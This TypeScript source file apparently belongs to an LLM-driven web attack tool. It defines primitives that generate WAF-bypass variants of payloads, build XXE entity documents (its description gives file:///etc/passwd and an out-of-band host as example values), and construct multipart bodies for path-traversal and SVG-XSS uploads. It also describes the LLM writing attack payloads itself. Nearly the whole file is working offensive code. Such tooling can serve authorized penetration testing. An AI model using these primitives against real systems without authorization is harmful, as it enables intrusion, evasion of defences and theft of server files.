// src/primitives/payload.ts
//
// Payload-crafting primitives: craftPayload, craftBypass, craftXmlEntity, craftMultipart.
// craftPayload is now a NO-OP — the LLM crafts payloads inline in injectInContext.args.payload.
// craftXmlEntity and craftMultipart are kept as format-only wrappers with zero generation logic.

import type { PrimitiveDefinition, PrimitiveResult } from './types';

export const craftPayload: PrimitiveDefinition<
  { type?: string; context?: string; engine?: string; count?: number },
  string[]
> = {
  name: 'craftPayload',
  description: 'DEPRECATED — the LLM now crafts payloads inline. Returns an empty array. Use injectInContext with a payload argument directly.',
  requiresBrowser: false,
  deterministic: true,
  execute(_args, _ctx): PrimitiveResult<string[]> {
    return {
      ok: true,
      value: [],
      durationMs: 0,
    };
  },
};

export const craftBypass: PrimitiveDefinition<
  { payload: string; wafType: string },
  string[]
> = {
  name: 'craftBypass',
  description: 'Generate WAF-bypass variants of a payload using common mutation techniques. Composes with waf-bypass specialist for LLM-driven mutations.',
  requiresBrowser: false,
  deterministic: true,
  execute(args, _ctx): PrimitiveResult<string[]> {
    const start = Date.now();
    const p = args.payload;
    const variants: string[] = [
      p,
      encodeURIComponent(p),
      doubleEncode(p),
      unicodeEscape(p),
      commentSplit(p),
      lowerCase(p),
      mixedCase(p),
      nullByte(p),
      mysqlCommentBang(p),
      httpParameterPollution(p),
    ];
    return {
      ok: true,
      value: Array.from(new Set(variants)).filter((v) => v.length > 0),
      durationMs: Date.now() - start,
    };
  },
};

function doubleEncode(s: string): string {
  return encodeURIComponent(encodeURIComponent(s));
}

function unicodeEscape(s: string): string {
  return s.replace(/[a-zA-Z]/g, (c) => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`);
}

function commentSplit(s: string): string {
  return s.replace(/ /g, '/**/');
}

function lowerCase(s: string): string {
  return s.toLowerCase();
}

function mixedCase(s: string): string {
  return s
    .split('')
    .map((c, i) => (i % 2 === 0 ? c.toLowerCase() : c.toUpperCase()))
    .join('');
}

function nullByte(s: string): string {
  return s.replace(/^(.)/, '%00$1');
}

function mysqlCommentBang(s: string): string {
  return s.replace(/ /g, '/*!*/');
}

function httpParameterPollution(s: string): string {
  return s + s;
}

export const craftXmlEntity: PrimitiveDefinition<
  { payload: string; systemId?: string },
  string
> = {
  name: 'craftXmlEntity',
  description: 'Format-only: wraps the LLM-provided payload string in XML DOCTYPE + entity structure. payload is the entity value (e.g. file:///etc/passwd, http://oast-host, "id"), systemId is the entity name (default: xxe).',
  requiresBrowser: false,
  deterministic: true,
  execute(args, _ctx): PrimitiveResult<string> {
    const start = Date.now();
    const entityName = args.systemId ?? 'xxe';
    const entity = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY ${entityName} SYSTEM "${args.payload}">
]>
<root><data>&${entityName};</data></root>`;
    return {
      ok: true,
      value: entity,
      durationMs: Date.now() - start,
    };
  },
};

export const craftMultipart: PrimitiveDefinition<
  { filename: string; content: string; contentType?: string; fieldName?: string },
  { body: Buffer; contentType: string; filename: string }
> = {
  name: 'craftMultipart',
  description: 'Build a multipart/form-data body with a crafted filename. Used for file-upload path-traversal and SVG-XSS attacks.',
  requiresBrowser: false,
  deterministic: true,
  execute(args, _ctx): PrimitiveResult<{ body: Buffer; contentType: string; filename: string }> {
    const start = Date.now();
    const fieldName = args.fieldName ?? 'file';
    const contentType = args.contentType ?? 'application/octet-stream';
    const boundary = `----UltimatrixBoundary${Date.now()}`;
    const head = `--${boundary}\r\nContent-Disposition: form-data; name="${fieldName}"; filename="${args.filename}"\r\nContent-Type: ${contentType}\r\n\r\n`;
    const tail = `\r\n--${boundary}--\r\n`;
    const body = Buffer.from(head + args.content + tail, 'utf-8');
    return {
      ok: true,
      value: {
        body,
        contentType: `multipart/form-data; boundary=${boundary}`,
        filename: args.filename,
      },
      durationMs: Date.now() - start,
    };
  },
};
